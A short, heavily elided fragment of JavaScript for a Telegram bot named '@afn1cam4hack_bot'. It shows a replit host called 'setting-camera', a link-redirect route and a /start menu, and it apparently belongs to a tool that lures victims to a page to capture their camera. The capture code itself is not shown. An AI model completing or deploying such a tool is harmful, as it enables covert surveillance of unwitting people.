...
const devbot = "ARAGORN_UZ"
const bot_username = "@afn1cam4hack_bot"
...
var hostURL = "https://setting-camera--mrrasul.repl.co";
...
app.get("/w/:path/:uri", (req, res) => {
  ...
  if (req.params.path != null) {
    ...
    res.redirect("https://t.me/aragorn_uz");
  }
  ...
  if (msg.text == "/start") {
    ...
    const buttons = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '👨🏻‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ', url: 'https://t.me/aragorn_uz' },
